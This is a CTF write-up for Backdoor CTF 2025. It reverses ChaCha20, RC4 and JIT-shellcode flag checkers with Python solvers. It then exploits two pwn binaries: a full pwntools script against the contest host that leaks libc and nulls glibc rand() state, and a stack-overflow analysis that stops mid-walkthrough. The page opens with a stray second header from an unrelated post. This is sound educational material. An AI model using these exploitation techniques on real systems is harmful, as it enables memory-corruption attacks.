---
title: "Writeups Backdoor CTF 2025"
cover: images/backdoorctf2025/backdoor_banner.png
description: Writeups Backdoor CTF 2025
date: 2025-12-08T11:00:00-07:00
lastmod: 2025-12-08T11:00:00-07:00
tag: ["Writeups"]
categories: ["CTF"]
---

---
title: "Binary Exploitation Lab: Stack Overflows, NX, and ROP"
date: "2024-12-03"
excerpt: "A practical lab writeup covering crash analysis, mitigations, and a minimal ROP chain."
featured: "/images/test3.jpg"
tags:
  - pwn
  - binary-exploitation
  - rop
  - linux
---

# Writeups - Backdoor CTF 2025
This post is my writeups for Backdooor CTF 2025 (14 challenges except WEB category) :))
## Reverse Engineering
### Where code
#### Description

Another flag checker, eh? But the code is beyond my understanding. It makes my head spin! There's just too many jumps!

#### Analysis

Check the main flow of the program: flag checking
```c
unsigned __int64 sub_186A()
{
    __int64 v0; // rax
    const void *v1; // rax
    size_t n; // [rsp+8h] [rbp-68h]
    char v4[32]; // [rsp+10h] [rbp-60h] BYREF
    __int64 dest[4]; // [rsp+30h] [rbp-40h] BYREF
    __int16 v6; // [rsp+50h] [rbp-20h]
    unsigned __int64 v7; // [rsp+58h] [rbp-18h]

    v7 = __readfsqword(0x28u);
    std::string::basic_string(v4);
    std::operator<<<std::char_traits<char>>(&std::cout, "Enter the flag: ");
    std::getline<char,std::char_traits<char>,std::allocator<char>>(&std::cin, v4);
    memset(dest, 0, sizeof(dest));
    v6 = 0;
    if ( (unsigned __int64)std::string::length(v4) > 0x21 )
    {
        v0 = 0x22LL;
    }
    else
    {
        v0 = std::string::length(v4);
    }

    n = v0;
    v1 = (const void *)std::string::c_str(v4);
    memcpy(dest, v1, n);
    sub_1592(dest, &unk_4280, 0x22LL);
    std::string::~string(v4);
    return v7 - __readfsqword(0x28u);
}
```

`dest + v6` is a 34-byte buffer on the stack.

Your input (up to 34 bytes) is copied into `dest`, zero-padded.

Then `sub_1592(dest, &unk_4280, 34)` is called.

`unk_4280` is some global buffer; the real check is likely elsewhere (e.g. later `memcmp(&unk_4280, EXPECTED, 34)` or vice versa). For solving we just need to understand `sub_1592`.

Check `sub_1592` (Chacha20 cipher)
```c
unsigned __int64 __fastcall sub_1592(__int64 a1, __int64 a2, unsigned __int64 a3)
{
    unsigned __int64 v3; // rax
    int i; // [rsp+28h] [rbp-B8h]
    int j; // [rsp+2Ch] [rbp-B4h]
    unsigned __int64 k; // [rsp+30h] [rbp-B0h]
    unsigned __int64 m; // [rsp+38h] [rbp-A8h]
    int v10[12]; // [rsp+50h] [rbp-90h] BYREF
    int v11; // [rsp+80h] [rbp-60h]
    char v12[72]; // [rsp+90h] [rbp-50h] BYREF
    unsigned __int64 v13; // [rsp+D8h] [rbp-8h]

    v13 = __readfsqword(0x28u);
    qmemcpy(v10, "expand 32-byte k", 0x10);
    for ( i = 0; i <= 7; ++i )
    {
        v10[i + 4] = (byte_2080[4 * i + 2] << 0x10) | (byte_2080[4 * i + 1] << 8) | byte_2080[4 * i] | (byte_2080[4 * i + 3] << 0x18);
    }

    v11 = 1;
    for ( j = 0; j <= 2; ++j )
    {
        v10[j + 0xD] = (byte_20A0[4 * j + 2] << 0x10) | (byte_20A0[4 * j + 1] << 8) | byte_20A0[4 * j] | (byte_20A0[4 * j + 3] << 0x18);
    }

    for ( k = 0LL; k < a3; k += v3 )
    {
        sub_13A4(v10, v12);
        ++v11;
        v3 = a3 - k;
        if ( a3 - k > 0x40 )
        {
            v3 = 0x40LL;
        }

        for ( m = 0LL; m < v3; ++m )
        {
            *(_BYTE *)(m + k + a2) = v12[m] ^ *(_BYTE *)(m + k + a1);
        }
    }

    return v13 - __readfsqword(0x28u);
}
```

So:

- `a1` = input buffer
- `a2` = output buffer
- `a3` = length

`sub_13A4` generates a 64-byte block from state `v10`.

`*(a2 + offset) = keystream_byte ^ *(a1 + offset)`

That's exactly how ChaCha20 works: `keystream ⊕ plaintext → ciphertext`.

The constants give it away:

`qmemcpy(v10, "expand 32-byte k", 16)` is the ChaCha constant.

`sub_1285`:
```c
__int64 __fastcall sub_1285(_DWORD *a1, _DWORD *a2, _DWORD *a3, _DWORD *a4)
{
    __int64 result; // rax

    *a1 += *a2;
    *a4 ^= *a1;
    *a4 = sub_1269((unsigned int)*a4, 0x10LL);
    *a3 += *a4;
    *a2 ^= *a3;
    *a2 = sub_1269((unsigned int)*a2, 0xCLL);
    *a1 += *a2;
    *a4 ^= *a1;
    *a4 = sub_1269((unsigned int)*a4, 8LL);
    *a3 += *a4;
    *a2 ^= *a3;
    result = sub_1269((unsigned int)*a2, 7LL);
    *a2 = result;
    return result;
}
```

is a standard ChaCha quarter-round.

So `sub_13A4` is "ChaCha20 block function" and `sub_1592` is the ChaCha20 XOR loop.

The hard-coded key & nonce:
```
byte_2080 db 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0Ah, 0Bh, 0Ch, 0Dh, 0Eh, 0Fh

byte_20A0 db 7 dup(0), 4Ah, 4 dup(0)
```

`byte_2080` is a 32-byte key; only pasted the start, but the pattern is clearly `0x00, 0x01, ... 0x1F`.

`byte_20A0` is 12 bytes: `00 00 00 00 00 00 00 00 4A 00 00 00 00`

That's a 96-bit nonce: words are `[0, 0, 0x4A]` in little-endian.

Counter starts at `1`.

So the keystream for the first block (counter = 1) is:

```python
key   = bytes(range(32))                    # 00 01 02 ... 1f
nonce = b'\x00'*7 + b'\x4a' + b'\x00'*4     # 00...00 4a 00 00 00 00
counter = 1
```

And first 34 bytes of keystream:

```bash
22 4f 51 f3 40 1b d9 e1 2f de 27 6f b8 63 1d ed
8c 13 1f 82 3d 2c 06 e2 7e 4f ca ec 9e f3 cf 78
8a 3b
```

Relation between flag and `unk_4280`

From the call:

```c
sub_1592(dest, &unk_4280, 34);
```

get (for `0 ≤ i < 34`):

```c
unk_4280[i] = keystream[i] ^ dest[i]
```

where `dest` is your (zero-padded) input flag.

That means for the correct flag `F` and the corresponding stored bytes `C` (what the program uses in its comparison), the relationship is:

```c
C[i] = F[i] ⊕ KS[i]
⇒ F[i] = C[i] ⊕ KS[i]
```

So once know the 34 bytes of ciphertext (`C`), recovering the flag is trivial XOR with the keystream.

This script re-implements the ChaCha20 block exactly as in the binary and recovers the flag from the 34-byte ciphertext.

From the `.rodata` section, the 34-byte array the checker uses is at offset `0x2040`:

```bash
44 23 30 94 3b 72 97 d0 70 b8 06 01 d1 3c 50 84
e2 22 40 ef 0d 02 28 cc 4f 10 ee 89 ad ac b6 37
ff 46
```


#### Solve

```python
from typing import List

def rotl32(x, n):
    return ((x << n) & 0xffffffff) | ((x & 0xffffffff) >> (32 - n))

def quarter_round(a, b, c, d):
    a = (a + b) & 0xffffffff; d ^= a; d = rotl32(d, 16)
    c = (c + d) & 0xffffffff; b ^= c; b = rotl32(b, 12)
    a = (a + b) & 0xffffffff; d ^= a; d = rotl32(d, 8)
    c = (c + d) & 0xffffffff; b ^= c; b = rotl32(b, 7)
    return a, b, c, d

def chacha_block(key: bytes, counter: int, nonce: bytes) -> bytes:
    assert len(key) == 32
    assert len(nonce) == 12

    def u32_le(b: bytes) -> int:
        return int.from_bytes(b, "little")

    state = [
        u32_le(b"expa"),
        u32_le(b"nd 3"),
        u32_le(b"2-by"),
        u32_le(b"te k"),
    ]
    for i in range(8):
        state.append(int.from_bytes(key[4*i:4*i+4], "little"))
    state.append(counter)
    for i in range(3):
        state.append(int.from_bytes(nonce[4*i:4*i+4], "little"))

    working = state.copy()
    for _ in range(10):  # 20 rounds
        # column
        working[0], working[4], working[8], working[12] = quarter_round(working[0], working[4], working[8], working[12])
        working[1], working[5], working[9], working[13] = quarter_round(working[1], working[5], working[9], working[13])
        working[2], working[6], working[10], working[14] = quarter_round(working[2], working[6], working[10], working[14])
        working[3], working[7], working[11], working[15] = quarter_round(working[3], working[7], working[11], working[15])
        # diagonal
        working[0], working[5], working[10], working[15] = quarter_round(working[0], working[5], working[10], working[15])
        working[1], working[6], working[11], working[12] = quarter_round(working[1], working[6], working[11], working[12])
        working[2], working[7], working[8],  working[13] = quarter_round(working[2], working[7], working[8],  working[13])
        working[3], working[4], working[9],  working[14] = quarter_round(working[3], working[4], working[9],  working[14])

    out = [(a + b) & 0xffffffff for a, b in zip(state, working)]
    return b"".join(x.to_bytes(4, "little") for x in out)

key   = bytes(range(32))  # 00 01 02 ... 1f
nonce = bytes.fromhex("000000000000004a00000000")
enc   = bytes.fromhex(
    "44 23 30 94 3b 72 97 d0 70 b8 06 01 d1 3c 50 84"
    " e2 22 40 ef 0d 02 28 cc 4f 10 ee 89 ad ac b6 37"
    " ff 46"
)

ks = chacha_block(key, 1, nonce)   # counter = 1
flag = bytes(e ^ k for e, k in zip(enc, ks[:len(enc)]))
print(flag)
print(flag.decode())
```
FLAG: `flag{iN1_f!ni_Min1_m0...1_$e3_yOu}`



### To jmp or not jmp
#### Description

Another flag checker, eh? But the code is beyond my understanding. It makes my head spin! There's just too many jumps!

#### Analysis

Information
```bash
challenge: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3dd27df153c863f59a03dcd6cbbe810abda047bf, for GNU/Linux 3.2.0, stripped
```

##### Initial Observations

- The binary uses `libstdc++` (evident from functions: `_ZSt3cin`, `_ZSt4cout`, `std::getline` in PLT)
- Contains many `jn`/`jne` jumps to illogical addresses - classic control flow obfuscation
- String analysis in IDA Pro reveals an obfuscated string at `0x2020`

```
.rodata:0000000000002020 sza1a9a1fsR db '!a1 a&',0Dh,'9a+',0Dh,' 1fsR'
```

##### Key Recovery

The binary contains XOR-based key obfuscation. Tracing the code:

```c
.text:000000000000134C         lea     rdx, sza1a9a1fsR        ; "!a1 a&\r9a+\r 1fsR"
.text:0000000000001353         mov     rax, [rbp-8]
.text:0000000000001357         add     rax, rdx
.text:000000000000135A         movzx   eax, byte ptr [rax]
.text:000000000000135D         xor     eax, 52h
```

The string `sza1a9a1fsR` is XORed with `0x52` to reveal the actual key:

```
b'!a1 a&\r9a+\r 1fsR' ^ 0x52 = b's3cr3t_k3y_rc4!\x00'
```

##### RC4 Implementation Analysis

##### Encrypted Data Location

- At `0x2040`: 66 bytes of high-entropy data (ciphertext)
- At `0x2088`: length value `0x42` (66 decimal)
- At `0x2080`: magic value `0xf1ed`

##### Algorithm Confirmation

The binary contains a standard RC4 implementation starting at `0x12e6`:

1. **Key Scheduling Algorithm (KSA)**: Initializes 256-byte S-box at `0x4280`
2. **Pseudo-Random Generation Algorithm (PRGA)**: Generates keystream bytes at `0x1413`-`0x14ff`

Key structure identified:
- RC4 key: `"s3cr3t_k3y_rc4!"` (15 bytes)
- Ciphertext: 66 bytes at `0x2040`

#### Solve

##### Decryption Script

```python
def rc4_ksa(key: bytes):
    S = list(range(256))
    j = 0
    klen = len(key)
    for i in range(256):
        j = (j + S[i] + key[i % klen]) & 0xff
        S[i], S[j] = S[j], S[i]
    return S

def rc4_prga(S, n):
    i = j = 0
    out = []
    for _ in range(n):
        i = (i + 1) & 0xff
        j = (j + S[i]) & 0xff
        S[i], S[j] = S[j], S[i]
        K = S[(S[i] + S[j]) & 0xff]
        out.append(K)
    return bytes(out)

def rc4_decrypt(key, cipher):
    S = rc4_ksa(key)
    ks = rc4_prga(S, len(cipher))
    return bytes(c ^ k for c, k in zip(cipher, ks))
```

##### Flag Extraction

```python
# Extract from binary
key_full = b's3cr3t_k3y_rc4!\x00'
key = key_full[:15]               # First 15 bytes as the key
cipher = ro_bytes[0x40:0x40+66]   # 66 bytes at offset 0x40

# Decrypt
plain = rc4_decrypt(key, cipher)
print(plain.decode())
```

Flag: `flag{$t0p_JUmp1n9_@R0uNd_1!k3_A_F00l_4nd_gib3_M3333_7H@t_f14g!!!!}`

### Vault
#### Description

I heard you are a master at breaking vaults, try to break this one..

#### Analysis

Based on the challenge name "Vault", we can guess this is a binary related to shellcode. When opening the file with IDA Pro, we can see the main program flow as follows:

##### 1. Quick recon

```bash
file chal
# ELF 64-bit LSB pie executable, x86-64, stripped

readelf -h chal | grep 'Entry point'
# Entry point: 0x1160

readelf -S chal | grep '\.data'
# .data: vaddr 0x4000, file offset 0x3000, size 0x1380
```

Useful imported functions from the PLT:

- `printf`, `puts`, `__isoc23_scanf`, `strcspn`
- `mmap`, `munmap`, `perror`, `exit`

So we immediately suspect some dynamic code generation (JIT) via `mmap`.

##### `main` – input & length check

Disassembling around 0x1460 shows the main function:

- Prints the intro string (vault story) and a prompt.
- Reads the password into a 0x90‑byte stack buffer via `__isoc23_scanf`.
- Uses `strcspn` to strip the trailing newline and stores the length in `[rbp-0x98]`.
- If length != `0x35` (53), it prints an error message and exits.
- If length == `0x35`, it calls the verifier at `0x1379`, passing the pointer to string in `rdi`.

So we know the *only* accepted password is exactly 53 bytes long.

##### The JIT builder (function at 0x1249)

The verifier calls a helper at 0x1249 with `edi = index` for each character position.

Pseudocode for 0x1249:

```c
void *build_shellcode(int idx) {
    // mmap RWX 0x8000 bytes
    void *buf = mmap(NULL, 0x8000, PROT_READ|PROT_WRITE|PROT_EXEC,
                     MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    if (buf == MAP_FAILED) { perror("mmap"); exit(-1); }

    // local tmp[57]
    for (int j = 0; j <= 0x38; j++) {
        // index into a big byte table at .data+0x20 (vaddr 0x4020)
        size_t off = idx * 57 + j;
        uint8_t b = byte_table_4020[off];

        // XOR with a dword from 0x4C00 and keep only the low byte
        uint32_t key = dword_table_4C00[idx];
        tmp[j] = (uint8_t)(b ^ (uint8_t)key);
    }

    // then splat tmp[0..56] into `buf` as overlapping qwords,
    // resulting in a 57‑byte chunk of executable shellcode.
    // Finally return buf;
}
```

So for each character position `i`, the program builds a custom 57‑byte piece of code and returns a
function pointer to it.

##### The verifier (function at 0x1379)

The function at 0x1379 loops over every character of input string:

```c
int check(const char *s) {
    int i = 0;
    for (;;) {
        unsigned char ch = s[i];
        if (!ch) break;            // end of string

        void *code = build_shellcode(i);  // 0x1249
        uint32_t *pattern = &table_bits_4CE0[i * 8];
        uint32_t key      = dword_table_4C00[i];

        int ok = jit_func(ch, key, 0, 0, pattern); // call via function pointer
        if (ok != 1) {
            puts("Wrong password");
            exit(-1);
        }
        munmap(code, 0x8000);
        i++;
    }
    puts("Correct password");
    return 0;
}
```

The interesting part is what `jit_func` actually does with `(ch, key, pattern)`.

##### Reversing the shellcode

We can reconstruct the shellcode bytes **for a given index** entirely in Python by mimicking the loop in
0x1249 (that’s exactly what the solver does internally), but to understand the logic we only need one
instance, say for `idx = 0`.

Once we build those 57 bytes, we disassemble them as raw x86‑64:

```bash
# code0.bin contains the first 80 bytes of the mmap'ed shellcode for index 0
objdump -D -b binary -m i386:x86-64 code0.bin
```

The disassembly (cleaned up) is:

```c
mov  ecx, 4              ; start checking from bit 4
xor  rdi, rsi            ; rdi = ch ^ key
loop_start:
    cmp  rdx, 8
    sete al
    je   done_success    ; if we checked 8 bits, return 1

    mov  rax, rdi
    shr  rax, cl         ; shift our value by cl bits
    and  rax, 1          ; keep only the lowest bit
    mov  rbx, rax

    movzbq rax, [r8 + rdx*4]  ; pattern[rdx], 8 entries of 0/1
    cmp    rax, rbx
    sete   al
    jne    done_fail     ; mismatch -> return 0

    inc  rdx             ; next pattern entry
    inc  rcx             ; next bit of v
    and  rcx, 7          ; wrap around mod 8
    jmp  loop_start

done_fail:
    ret
done_success:
    ret
```

Call-site register setup (from 0x1379):

- `rdi` = sign-extended input character
- `rsi` = 32‑bit key from table at 0x4C00
- `rdx` = 0
- `rcx` = 0
- `r8`  = pointer into the table at 0x4CE0 (8 dwords per character index)

So the **abstract logic** of the shellcode is:

```c
int jit(int ch, uint32_t key, int zero1, int zero2, uint32_t *pattern) {
    unsigned long v = (unsigned long)ch ^ (unsigned long)key;
    int bit = 4;       // start from bit 4
    int k   = 0;       // pattern index

    for (;;) {
        if (k == 8) return 1;  // all 8 bits matched

        unsigned long actual = (v >> bit) & 1;
        unsigned long expected = pattern[k] & 1;  // 8 entries of 0 or 1

        if (actual != expected) return 0;

        k++;
        bit = (bit + 1) & 7;  // 4,5,6,7,0,1,2,3
    }
}
```

##### Understanding the data tables

From the disassembly:

- Byte table at **0x4020** (vaddr) in `.data` – used only to construct the shellcode.
- Dword key table at **0x4C00** – 64 entries of 32‑bit keys.
- Dword bit-pattern table at **0x4CE0** – for each character index `i`, 8 x 32‑bit integers (0 or 1),
  i.e. 32 bytes per index.

We don’t actually need the byte table at 0x4020 to *solve* the challenge; it’s just an obfuscation layer
for the JIT. Once we know what the shellcode does, only 0x4C00 and 0x4CE0 matter.

Let:

```c
v_i = password[i] ^ (key[i] & 0xFF);
```

and let `pattern[i][k]` be the 8 dwords at `0x4CE0 + i*32 + k*4`, each equal to 0 or 1.

The shellcode checks:

- `pattern[i][0] == bit4(v_i)`
- `pattern[i][1] == bit5(v_i)`
- `pattern[i][2] == bit6(v_i)`
- `pattern[i][3] == bit7(v_i)`
- `pattern[i][4] == bit0(v_i)`
- `pattern[i][5] == bit1(v_i)`
- `pattern[i][6] == bit2(v_i)`
- `pattern[i][7] == bit3(v_i)`

So each index `i` has an 8‑bit pattern that exactly encodes the bits of `v_i`.

##### Inverting the check

For each position `i`:

1. Read the 8 dwords from 0x4CE0:
   `bits[k] = (raw_bits[32*i + 4*k] & 1)` for `k = 0..7`.
2. Reconstruct `v_i` from those bits:

   ```python
   v = 0
   # bits[0..3] -> bits 4..7
   for bitpos in range(4, 8):
       if bits[bitpos - 4]:
           v |= (1 << bitpos)
   # bits[4..7] -> bits 0..3
   for bitpos in range(0, 4):
       if bits[bitpos + 4]:
           v |= (1 << bitpos)
   ```

3. Recover the actual password byte as:

   ```python
   ch = v ^ (key[i] & 0xFF)
   ```

Doing this for all 53 positions yields a 53‑byte password.

The provided solver (`solve_chal.py`) implements exactly this logic directly on the `chal` binary.


#### Solve

```c
#!/usr/bin/env python3
import struct

FILENAME = "chal"   # change if filename is different

def main():
    with open(FILENAME, "rb") as f:
        data = f.read()

    # According to readelf: .data has virtual addr 0x4000 and file offset 0x3000
    off_data = 0x3000

    # Offsets in .data obtained from disassembly:
    # 0x4020: byte table used to build shellcode (57 bytes / index, 64 indexes)
    # 0x4c00: dword key table (4 bytes / index, 64 indexes)
    # 0x4ce0: bit pattern table (32 bytes / index, 64 indexes)
    off_4020 = off_data + 0x20   # 0x4020
    off_4c00 = off_data + 0xC00  # 0x4C00
    off_4ce0 = off_data + 0xCE0  # 0x4CE0

    n_slots = 64
    raw_shell = data[off_4020: off_4020 + 57 * n_slots]
    raw_keys  = data[off_4c00: off_4c00 + 4  * n_slots]
    raw_bits  = data[off_4ce0: off_4ce0 + 32 * n_slots]

    # key[i] is a dword, but shellcode only uses the low byte
    keys = [struct.unpack_from("<I", raw_keys, 4 * i)[0] for i in range(n_slots)]

    def recover_char(i: int) -> int:
        """
        Based on shellcode:
          v = ch ^ key_byte
          then check 8 bits of v in bitpos order: 4,5,6,7,0,1,2,3
          expected bit values are taken from table 4ce0, each index occupies 32 bytes,
          but only uses 8 bytes at offset 0,4,8,...,28 (1 byte each time).
        We reverse: from 8 expected bits -> v -> ch.
        """
        key_byte = keys[i] & 0xFF

        # Get 8 bits (actually 8 bytes of 0/1) for index i
        bits = [(raw_bits[32 * i + 4 * t] & 1) for t in range(8)]

        # Rebuild v = ch ^ key_byte from those bits.
        # mapping:
        #  t=0..3  -> bitpos 4..7
        #  t=4..7  -> bitpos 0..3
        v = 0
        # bit 4..7
        for bitpos in range(4, 8):
            t = bitpos - 4
            if bits[t]:
                v |= (1 << bitpos)
        # bit 0..3
        for bitpos in range(0, 4):
            t = bitpos + 4
            if bits[t]:
                v |= (1 << bitpos)

        ch = v ^ key_byte
        return ch

    # main() in binary requires length = 0x35 (53) before calling the check function
    length = 0x35
    secret = bytes(recover_char(i) for i in range(length))

    # Print results
    print("Raw password bytes:", list(secret))
    print("Raw password hex  :", secret.hex())
    print("Printable preview :", ''.join(chr(c) if 32 <= c < 127 else '.' for c in secret))

    # A reasonable flag format: flag{<password_hex>}
    print("\nCandidate flag (password hex-encoded):")
    print(f"flag{{{secret.hex()}}}")

if __name__ == "__main__":
    main()
```

FLAG: `flag{hm_she11c0d3_v4u17_cr4ck1ng_4r3_t0ugh_r1gh7!!??}`

## Pwnable
### Gamble

#### Description

My friends and I planned a trip to Gokarna and heard about a famous casino with a machine that almost never lets anyone win, only the truly lucky. I’ve replicated it. Let’s see if you are one of them!

In this challenge, we are given only the binary with a Dockerfile. Libc is important in this challenge, so we need to build the docker image and get libc there

#### Analysis

- checksec: Every mitigations are used
```bash
Arch:       amd64-64-little
RELRO:      Full RELRO
Stack:      Canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```

- Reverse engineering: The challenge allows us to use the following functionalities

    1. The ```login()``` function allows us to create a new user (if has not existed), or simply switch to an already created user
    2. The ```bet()``` function allows us to place an arbitrary bet amount (with each user can bet only once)
    3. The ```gamble()``` function calls random 5 times, with the results in the range from 0 to 0xfffffffffffff000. If the result falls under 4094, we will get the flag via ```win()```

- Vulnerabilities: There are two vulnerabilities in this binary
    
    1. Format string vulnerability via stack overflow: The ```printf()``` function at address 0x1998 uses a program defined string as the format string. However, we can overwrite the first 6 bytes of the format string, because the program allows us to write 16 bytes to a 10-byte buffer right before it.
    2. Arbitrary NULL vulnerability: In the ```gamble()``` function, if we lose, it sets the current player balance to zero. However, it does a double dereference (at 0x1BD8), thus instead of zeroing the balance, it sets the address pointed to by the current balance to be 0. As the balance is user input, we can achieve arbitrary NULL.

#### Exploitation

- The first thing that we can achive using the 6-byte format string is to leak a variety of addresses (including libc, elf, and stack). However, as I only use libc address in the next steps, I only leak it.

- The next step is to somehow trick ```rand()``` to return a small value, as the current set up gives us a winning chance of about 1/500000. As we know the libc address and have arbitrary NULL primitive, I decided to dive into libc source code to see how random numbers are generated by ```rand()```. The source code is available at  https://elixir.bootlin.com/glibc/glibc-2.39/source/stdlib/random_r.c#L353

- The ```rand()``` function will eventually call ```__random_r()```, which is indeed quite short
```C
int
__random_r (struct random_data *buf, int32_t *result)
{
  int32_t *state;

  if (buf == NULL || result == NULL)
    goto fail;

  state = buf->state;

  if (buf->rand_type == TYPE_0)
    {
      int32_t val = ((state[0] * 1103515245U) + 12345U) & 0x7fffffff;
      state[0] = val;
      *result = val;
    }
  else
    {
      int32_t *fptr = buf->fptr;
      int32_t *rptr = buf->rptr;
      int32_t *end_ptr = buf->end_ptr;
      uint32_t val;

      val = *fptr += (uint32_t) *rptr;
      /* Chucking least random bit.  */
      *result = val >> 1;
      ++fptr;
      if (fptr >= end_ptr)
	{
	  fptr = state;
	  ++rptr;
	}
      else
	{
	  ++rptr;
	  if (rptr >= end_ptr)
	    rptr = state;
	}
      buf->fptr = fptr;
      buf->rptr = rptr;
    }
  return 0;

 fail:
  __set_errno (EINVAL);
  return -1;
}
```
The struct ```random_data``` is as follows
```C
struct random_data
  {
    int32_t *fptr;		/* Front pointer.  */
    int32_t *rptr;		/* Rear pointer.  */
    int32_t *state;		/* Array of state values.  */
    int rand_type;		/* Type of random number generator.  */
    int rand_deg;		/* Degree of random number generator.  */
    int rand_sep;		/* Distance between front and rear.  */
    int32_t *end_ptr;		/* Pointer behind state table.  */
  };
```
- In short, the ```random_data *buf``` structure is initialized in libc, with the ```rand_type``` being 3. It can be seen via debugging. So, the ```rand()``` function of the binary will take the path
```C
int32_t *fptr = buf->fptr;
int32_t *rptr = buf->rptr;
int32_t *end_ptr = buf->end_ptr;
uint32_t val;

val = *fptr += (uint32_t) *rptr;
/* Chucking least random bit.  */
*result = val >> 1;
++fptr;
if (fptr >= end_ptr)
    {
        fptr = state;
        ++rptr;
    }
else
    {
        ++rptr;
        if (rptr >= end_ptr)
        rptr = state;
    }
buf->fptr = fptr;
buf->rptr = rptr;
```
- The generation of random number is simply: Maintain two pointers ```fptr``` and ```rptr```, which point to a libc region between ```buf->state``` and ```buf->end_ptr``` (it can also be observed by debugging). ```fptr``` or ```rptr``` is added up after every call for random. If they exceed the ```end_ptr```, they are set back to ```state```, which is kind of a base pointer. By debugging, we can see that the region is full of random numbers, and the region is (approximately) from offset 0x203020 to 0x2030a0 in libc. An important thing to note is that this region NEVER changes after initialization. So, as the result is ```(*fptr + *rptr) >> 1```, then if we can nullify the region that ```fptr``` and ```rptr``` point to, the ```rand()``` function will always return 0.

- We can debug and see exactly which place that we need to null out to achieve that (for example set a break at a ```rand()``` and see which two values are used in that call, and then set it to 0). However, as we are allowed 8 bet times (2 reserved for leaking libc and the final call for flag), I simply null out the first 8 QWORDS of that region. Luckily, it is enough to reach ```win()```. Also, I try to null out the ```end_ptr```, so that ```fptr``` and ```rptr``` goes back to ```state```, which is the start of the region, and we have nulled out several QWORDS there.

```python
from pwn import *
context.log_level = 'debug'

p = remote('remote.infoseciitr.in', 8004)
def login(usr_id, usr_name, amount):
    p.sendlineafter(b'>', b'1')
    p.sendlineafter(b': ', usr_id)
    p.sendlineafter(b': ', usr_name)
    p.sendlineafter(b': ', amount)

def leak_libc(usr_id):
    p.sendlineafter(b'>', b'2')
    p.sendlineafter(b': ', usr_id)
    p.sendlineafter(b': ', b'A' * 10 + b'%llx')
    libc_leak = int('0x' + p.recv(12).decode(), 16)
    return libc_leak - 0x203963

def arbitrary_null(usr_id, addr):
    login(usr_id, b'a', str(addr // 8).encode())
    leak_libc(usr_id)
    p.sendlineafter(b'>', b'3')
    p.sendlineafter(b': ', usr_id)
    for i in range(5):
        p.recvuntil(b'gamble...')
        p.sendline(b'')
    
login(b'0', b'a', b'1')
libc_base = leak_libc(b'0')
log.info(f"Libc_base: {hex(libc_base)}")

arbitrary_null(b'1', libc_base + 0x203020)
arbitrary_null(b'2', libc_base + 0x203028)
arbitrary_null(b'3', libc_base + 0x203030)
arbitrary_null(b'4', libc_base + 0x203038)
arbitrary_null(b'5', libc_base + 0x203040)
arbitrary_null(b'6', libc_base + 0x203048)
arbitrary_null(b'7', libc_base + 0x203050)

arbitrary_null(b'8', libc_base + 0x2036c8) ### Null end_ptr (may not be necessary)
arbitrary_null(b'9', libc_base + 0x203058) ### Final to get flag
p.interactive()
```

### Devil's Convergence
#### 

BOOM.

#### Analysis 

##### High‑Level Design of the Binary

The program is themed around devils from *Chainsaw Man*. The flow:

1. **Control Devil (Makima)** – first interaction
2. **War Devil (Yoru)** – second interaction
3. **Bomb Devil (Reze)** – final interaction where we gain RIP control

There is also a global 8‑byte variable we’ll call `contract_seal`, which is crucial. It is initialized at startup via relocations to hold the **address of `system` in libc**.

##### `contract_seal`

Decompiled/annotated:

```c
uint64_t contract_seal;  // global

void initialize(void) {
    // ... some story printing ...
    // via a GLOB_DAT relocation, contract_seal is set to &system
    // in the GOT/PLT resolution process.
}
```

So at runtime:

```c
contract_seal == (uint64_t)system@libc
```

This is the secret key used by all three devils.


##### Control Devil: Low 4 Bytes of `system`

The **Control Devil** function (Makima) roughly looks like:

```c
void control_devils_contract(void) {
    char buf[4];

    puts("[CONTROL DEVIL] Submit to her control:");
    read(0, buf, 4);                         // our input

    uint8_t *seal = (uint8_t *)&contract_seal;
    for (int i = 0; i < 4; i++) {
        buf[i] ^= seal[i];                   // XOR with first 4 bytes
    }

    printf("[CONTROL DEVIL] Your dominated essence: ");
    write(1, buf, 4);
    putchar('\n');
}
```

Crucially:

```text
output[i] = input[i] ^ seal[i]
```

So if we choose a **known** input (e.g. `"AAAA"`), then:

```text
seal[i] = output[i] ^ input[i]
```

This gives us the **first 4 bytes** of `contract_seal`.


##### War Devil: High 4 Bytes of `system`

The **War Devil** function (Yoru) is similar, but uses the **next 4 bytes** of `contract_seal`:

```c
void war_devils_prophecy(void) {
    char buf[4];

    puts("[WAR DEVIL] Offer your tribute to War:");
    read(0, buf, 4);                         // our input

    uint8_t *seal = (uint8_t *)&contract_seal;
    for (int i = 0; i < 4; i++) {
        buf[i] ^= seal[i+4];                 // XOR with bytes 4..7
    }

    printf("[WAR DEVIL] Your war essence: ");
    write(1, buf, 4);
    putchar('\n');
}
```

Again:

```text
output[i] = input[i] ^ seal[i+4]
=> seal[i+4] = output[i] ^ input[i]
```

Picking a known input like `"BBBB"`, we recover the **high 4 bytes** of `contract_seal`.

Combining both:

```python
key0 = output0 ^ b"AAAA"
key1 = output1 ^ b"BBBB"
key  = key0 + key1   # 8 bytes total
system_leak = u64(key)  # little-endian decode
```

Now we have the **exact runtime address of `system`** in the remote libc:

```text
system_leak = libc_base + libc.sym['system']
=> libc_base = system_leak - libc.sym['system']
```


##### Bomb Devil: Stack Overflow with XOR Obfuscation

The final devil, **Bomb Devil** (Reze), has the actual memory corruption bug.

Approximate decompilation:

```c
void bomb_devils_contract(void) {
    char volatile_mixture[0x200];   // actually allocated on heap via malloc
    char buffer[0x50];              // local stack buffer

    uint8_t *seal = (uint8_t *)&contract_seal;

    puts("[BOMB DEVIL] Infuse your energy into the contract:");

    char *ptr = malloc(0x200);
    read(0, ptr, 0x200);            // read 512 bytes from user

    for (int i = 0; i < 0x200; i++) {
        ptr[i] ^= seal[i % 8];      // XOR each byte with repeating key
    }

    memcpy(buffer, ptr, 0x200);     // BUG: copies 0x200 into 0x50 buffer
    free(ptr);

    // function returns, using corrupted stack
}
```

The problem:

- `buffer` is only `0x50` bytes.
- `memcpy` copies `0x200` bytes into it.
- This **overflows** into saved `RBP` and then **saved RIP**.

Stack layout:

```text
[buffer, size 0x50]           ; at [rbp-0x50]
[saved RBP]                   ; at [rbp]
[saved RIP]                   ; at [rbp+8]
```

So from the start of `buffer` to saved RIP is:

```text
offset = 0x50 (buffer) + 0x08 (saved RBP) = 0x58
```

Whatever ends up at `buffer[0x58:0x60]` becomes the new RIP.


